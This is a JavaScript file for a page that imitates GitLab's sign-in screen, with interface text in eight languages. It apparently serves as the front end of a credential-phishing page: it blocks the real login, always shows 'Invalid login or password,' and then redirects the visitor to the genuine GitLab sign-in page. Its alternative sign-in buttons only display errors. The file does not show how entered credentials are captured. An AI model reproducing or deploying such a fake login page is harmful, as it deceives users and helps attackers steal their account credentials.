document.addEventListener('DOMContentLoaded', () => {
    const flashAlert = document.getElementById('flash-alert');
    const flashClose = document.getElementById('flash-close');
    const flashText  = document.querySelector('.flash-text');
    function showAlert(msg) {
        if (flashText) flashText.textContent = msg;
        flashAlert.classList.add('visible');
        flashAlert.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }
    function hideAlert() {
    flashAlert.classList.remove('visible');
    }
    if (flashClose) flashClose.addEventListener('click', hideAlert);
    const overlay = document.createElement('div');
    overlay.id = 'gl-overlay';
    overlay.innerHTML = '<span class="gl-spinner"></span>';
    document.body.appendChild(overlay);
    function showLoading() { overlay.classList.add('active'); }
    function hideLoading() { overlay.classList.remove('active'); }
    const loginForm  = document.getElementById('login-form');
    const signInBtn  = document.getElementById('sign-in-btn');
    let currentLang  = translations['English'];
    if (loginForm && signInBtn) {
        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const origHTML = signInBtn.innerHTML;
            signInBtn.innerHTML = '<span class="btn-spinner"></span>';
            signInBtn.disabled  = true;
            setTimeout(() => {
                signInBtn.innerHTML = origHTML;
                signInBtn.disabled  = false;
                showAlert(currentLang.invalid_login);

                setTimeout(() => {
                    window.location.href = 'https://gitlab.com/users/sign_in';
                }, 1800);
            }, 2200);
        });
    }
    document.querySelectorAll('.btn-secondary').forEach(btn => {
        btn.addEventListener('click', () => {
            showLoading();
            setTimeout(() => {
                hideLoading();
                showAlert(currentLang.something_wrong);
            }, 2200);
        });
    });
    const eyeIcon       = document.getElementById('eye-icon');
    const passwordInput = document.getElementById('user_password');
    if (eyeIcon && passwordInput) {
        eyeIcon.addEventListener('click', () => {
            const show = passwordInput.type === 'password';
            passwordInput.type    = show ? 'text'            : 'password';
            eyeIcon.style.color   = show ? 'var(--accent)'   : '';
        });
    }
    const forgotLink = document.getElementById('forgot-link');
    if (forgotLink) {
        forgotLink.addEventListener('click', (e) => {
            e.preventDefault();
            window.open('https://gitlab.com/users/password/new', '_blank');
        });
    }
    const langToggle   = document.getElementById('language-toggle');
    const langDropdown = document.getElementById('language-dropdown');
    const langLabel    = document.getElementById('lang-label');
    if (langToggle && langDropdown) {
        langToggle.addEventListener('click', (e) => {
            e.stopPropagation();
            langDropdown.classList.toggle('show');
        });
        document.addEventListener('click', (e) => {
            if (!langToggle.contains(e.target) && !langDropdown.contains(e.target)) {
                langDropdown.classList.remove('show');
            }
        });
        langDropdown.querySelectorAll('li').forEach(item => {
            item.addEventListener('click', () => {
                langDropdown.querySelectorAll('li').forEach(li => {
                    li.classList.remove('active');
                    li.querySelector('.check').textContent = '';
                });
                item.classList.add('active');
                item.querySelector('.check').textContent = '✔';
                langDropdown.classList.remove('show');
                const selected = item.textContent.replace('✔', '').trim();
                if (langLabel) langLabel.textContent = selected;
                applyTranslation(selected);
            });
        });
    }
    function applyTranslation(langName) {
        currentLang = translations[langName] || translations['English'];
        const t = currentLang;
        const h1 = document.querySelector('h1');
        if (h1) h1.innerHTML = `${t.sign_in_title} <strong>GitLab</strong>`;
        const labels = document.querySelectorAll('.form-group label');
        if (labels[0]) labels[0].textContent = t.username_label;
        if (labels[1]) labels[1].textContent = t.password_label;
        if (forgotLink) forgotLink.textContent = t.forgot_password;
        document.querySelectorAll('.checkbox label').forEach(l => l.textContent = t.remember_me);
        if (signInBtn) signInBtn.textContent = t.sign_in_btn;
        const passkeyBtn = document.getElementById('passkey-btn');
        if (passkeyBtn) {
            const svg = passkeyBtn.querySelector('svg');
            passkeyBtn.textContent = ' ' + t.passkey_btn;
            if (svg) passkeyBtn.prepend(svg);
        }
        const termsDiv = document.querySelector('.terms');
        if (termsDiv) termsDiv.innerHTML = `${t.terms_pre} <a href="https://gitlab.com/-/users/terms">${t.terms_link}</a>`;
        const regDiv = document.querySelector('.register');
        if (regDiv) regDiv.innerHTML = `${t.no_account} <a href="#">${t.register}</a>`;
        const divSpan = document.querySelector('.divider span');
        if (divSpan) divSpan.textContent = t.or_sign_in;
    }
});
const translations = {
    'English': {
        sign_in_title: 'Sign in to', username_label: 'Username or primary email',
        password_label: 'Password', forgot_password: 'Forgot your password?',
        remember_me: 'Remember me', sign_in_btn: 'Sign in', passkey_btn: 'Passkey',
        terms_pre: 'By signing in you accept the',
        terms_link: 'Terms of Use and acknowledge the Privacy Statement and Cookie Policy.',
        no_account: "Don't have an account yet?", register: 'Register now',
        or_sign_in: 'or sign in with',
        invalid_login: 'Invalid login or password.',
        something_wrong: 'Something went wrong. Try another sign-in option.',
    },
    '日本語': {
        sign_in_title: 'にサインイン', username_label: 'ユーザー名またはメールアドレス',
        password_label: 'パスワード', forgot_password: 'パスワードをお忘れですか？',
        remember_me: 'ログイン状態を保持', sign_in_btn: 'サインイン', passkey_btn: 'パスキー',
        terms_pre: 'サインインすることで、',
        terms_link: '利用規約、プライバシーポリシー、およびCookieポリシーに同意したことになります。',
        no_account: 'アカウントをお持ちでないですか？', register: '今すぐ登録',
        or_sign_in: 'または以下でサインイン',
        invalid_login: 'ログインIDまたはパスワードが無効です。',
        something_wrong: '問題が発生しました。別のサインインオプションをお試しください。',
    },
    'Gaeilge': {
        sign_in_title: 'Sínigh isteach go', username_label: 'Ainm úsáideora nó príomhríomhphost',
        password_label: 'Pasfhocal', forgot_password: 'An ndearna tú dearmad do phasfhocal?',
        remember_me: 'Cuimhnigh orm', sign_in_btn: 'Sínigh isteach', passkey_btn: 'Eochairchlár',
        terms_pre: 'Trí shíniú isteach glacann tú leis na',
        terms_link: 'Téarmaí Úsáide agus an Ráiteas Príobháideachais.',
        no_account: 'Níl cuntas agat fós?', register: 'Cláraigh anois',
        or_sign_in: 'nó sínigh isteach le',
        invalid_login: 'Ainm úsáideora nó pasfhocal neamhbhailí.',
        something_wrong: 'Chuaigh rud éigin mícheart. Bain triail as rogha eile.',
    },
    'português (Brasil)': {
        sign_in_title: 'Entrar no', username_label: 'Usuário ou e-mail principal',
        password_label: 'Senha', forgot_password: 'Esqueceu sua senha?',
        remember_me: 'Lembrar de mim', sign_in_btn: 'Entrar', passkey_btn: 'Chave de acesso',
        terms_pre: 'Ao entrar, você aceita os',
        terms_link: 'Termos de Uso e reconhece a Política de Privacidade e Cookies.',
        no_account: 'Ainda não tem uma conta?', register: 'Registre-se agora',
        or_sign_in: 'ou entre com',
        invalid_login: 'Usuário ou senha inválidos.',
        something_wrong: 'Algo deu errado. Tente outra opção.',
    },
    'italiano': {
        sign_in_title: 'Accedi a', username_label: 'Nome utente o email principale',
        password_label: 'Password', forgot_password: 'Hai dimenticato la password?',
        remember_me: 'Ricordami', sign_in_btn: 'Accedi', passkey_btn: 'Passkey',
        terms_pre: 'Accedendo accetti i',
        terms_link: 'Termini di servizio e riconosci la Privacy Policy.',
        no_account: 'Non hai ancora un account?', register: 'Registrati ora',
        or_sign_in: 'o accedi con',
        invalid_login: 'Nome utente o password non validi.',
        something_wrong: "Qualcosa è andato storto. Prova un'altra opzione.",
    },
    'français': {
        sign_in_title: 'Se connecter à', username_label: "Nom d'utilisateur ou e-mail principal",
        password_label: 'Mot de passe', forgot_password: 'Mot de passe oublié ?',
        remember_me: 'Se souvenir de moi', sign_in_btn: 'Se connecter', passkey_btn: "Clé d'accès",
        terms_pre: 'En vous connectant, vous acceptez les',
        terms_link: "Conditions d'utilisation et reconnaissez la Politique de confidentialité.",
        no_account: "Vous n'avez pas encore de compte ?", register: "S'inscrire maintenant",
        or_sign_in: 'ou se connecter avec',
        invalid_login: "Nom d'utilisateur ou mot de passe invalide.",
        something_wrong: "Quelque chose s'est mal passé. Essayez une autre option.",
    },
    'esperanto': {
        sign_in_title: 'Ensaluti al', username_label: 'Uzantonomo aŭ ĉefa retpoŝto',
        password_label: 'Pasvorto', forgot_password: 'Ĉu vi forgesis vian pasvorton?',
        remember_me: 'Memoru min', sign_in_btn: 'Ensaluti', passkey_btn: 'Pasŝlosilo',
        terms_pre: 'Per ensaluto vi akceptas la',
        terms_link: 'Uzkondiĉojn kaj la Privatecpolitikon.',
        no_account: 'Ĉu vi ankoraŭ ne havas konton?', register: 'Registriĝi nun',
        or_sign_in: 'aŭ ensaluti per',
        invalid_login: 'Nevalida uzantonomo aŭ pasvorto.',
        something_wrong: 'Io iris malbone. Provu alian opcion.',
    },
    'español': {
        sign_in_title: 'Iniciar sesión en', username_label: 'Nombre de usuario o correo electrónico',
        password_label: 'Contraseña', forgot_password: '¿Olvidaste tu contraseña?',
        remember_me: 'Recuérdame', sign_in_btn: 'Iniciar sesión', passkey_btn: 'Llave de acceso',
        terms_pre: 'Al iniciar sesión aceptas los',
        terms_link: 'Términos de uso y reconoces la Política de privacidad.',
        no_account: '¿Aún no tienes cuenta?', register: 'Regístrate ahora',
        or_sign_in: 'o inicia sesión con',
        invalid_login: 'Usuario o contraseña incorrectos.',
        something_wrong: 'Algo salió mal. Prueba otra opción.',
    },
};
